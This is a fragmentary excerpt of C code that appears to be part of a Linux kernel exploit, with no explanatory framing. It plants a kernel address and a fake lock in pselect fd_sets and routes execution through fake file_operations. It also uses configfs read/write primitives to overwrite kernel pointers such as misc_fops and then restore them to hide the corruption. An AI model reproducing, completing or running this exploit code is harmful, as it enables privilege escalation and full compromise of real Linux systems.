...
void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  ...
  fdset_put_word(in, 0, text_addr(INIT_TASK));
  fdset_put_word(in, 1, fake_lock);
  fdset_put_word(in, 2, 3);
...
void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx "
             "fops=%016zx\n",
...
int repair_fake_fops_llseek(int fd) {
  ...
  return wr == (ssize_t)sizeof(llseek) && rd == (ssize_t)sizeof(after) &&
         after == llseek;
}
...
int restore_slide_boot_id(int fd) {
  ...
  configfs_read_once(fd, boot_id_data, &slide_bootid_before,
                     sizeof(slide_bootid_before));
  slide_bootid_restore_ret = configfs_write_once(
      fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(fd, boot_id_data, &slide_bootid_after,
...
fail:
  if (dirty) {
    ...
    cfi_restore_ret = configfs_write_once(fd, misc_fops, &original_fops_fail,
